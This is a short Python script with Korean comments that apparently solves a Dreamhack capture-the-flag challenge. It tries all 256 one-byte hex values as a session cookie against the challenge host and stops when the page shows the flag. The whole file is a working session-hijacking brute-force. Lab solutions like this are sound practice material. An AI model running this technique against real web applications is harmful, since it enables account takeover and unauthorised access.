import requests

# 타겟 URL
url = "http://host3.dreamhack.games:24498/"
login_url = url + "login"
session_key = 'sessionid'

# 가능한 1바이트(2자리 16진수) 세션 ID 값 생성
possible_values = [f'{i:02x}' for i in range(256)]

for session_id in possible_values:
    # 세션 ID를 쿠키로 설정
    cookies = {session_key: session_id}
    
    # 메인 페이지에 요청을 보내어 플래그가 포함된 응답을 확인
    response = requests.get(url, cookies=cookies)
    
    if "DH{" in response.text:  # 플래그가 있는지 확인
        print(f"Found valid session ID: {session_id}")
        print(response.text)
        break
    else:
        print(f"Tried session ID: {session_id} - Invalid")
